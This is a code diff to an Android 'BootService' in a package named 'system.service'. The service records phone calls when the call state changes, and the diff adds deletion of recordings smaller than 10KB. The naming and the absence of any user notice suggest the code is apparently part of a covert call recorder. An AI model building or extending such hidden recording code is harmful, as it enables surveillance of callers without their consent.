@@ -1,5 +1,6 @@
 package system.service;
 
+import java.io.File;
 import java.util.Date;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -66,6 +67,9 @@ public class BootService extends Service
 	}
 	
 	private final PhoneStateListener phoneListener = new PhoneStateListener() {
+		private static final long MIN_FILE_SIZE = 10240; // 10KB
+		private String fileFullPath = "";
+		
 		@Override
         public void onCallStateChanged(int state, String incomingNumber) {
 			
@@ -94,7 +98,7 @@ public class BootService extends Service
             			// Phone call recording
             			try {
                             Date startDate = new Date();
-                            String fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate); 
+                            this.fileFullPath = makePhonecallRecordFileFullPath(context, otherSidePhoneNum, startDate); 
                             recorder.setOutputFile(fileFullPath);
                             recorder.prepare();
                             recorder.start();
@@ -108,6 +112,17 @@ public class BootService extends Service
                 		if (recordStarted) {
         					recorder.stop();
         					recordStarted = false;
+        					
+        					// If the size is less than 10KB, delete it
+        					try {
+        						File file = new File(this.fileFullPath);
+        						if (file.exists() && file.length() < MIN_FILE_SIZE) {
+        							file.delete();
+        						}
+        						this.fileFullPath = "";
+        					} catch (Exception ex) {
+        						//
+        					}
         				}
                 		break;
                 	}
